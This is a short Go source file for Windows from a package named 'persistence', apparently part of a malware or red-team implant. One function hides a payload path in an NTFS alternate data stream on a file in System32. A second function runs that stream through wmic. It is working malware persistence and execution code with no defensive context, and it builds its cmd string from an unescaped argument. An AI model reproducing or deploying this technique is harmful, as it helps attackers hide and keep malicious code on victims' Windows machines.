//go:build windows

package persistence

import (
"os/exec"
)

func ADSPersist(payloadPath string) bool {
cmd := exec.Command("cmd", "/c", "echo "+payloadPath+" > C:\\Windows\\System32\\ANGEL.txt:ANGEL")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func ADSExecute() bool {
cmd := exec.Command("cmd", "/c", "wmic process call create \"C:\\Windows\\System32\\ANGEL.txt:ANGEL\"")
err := cmd.Run()
if err != nil {
return false
}
return true
}
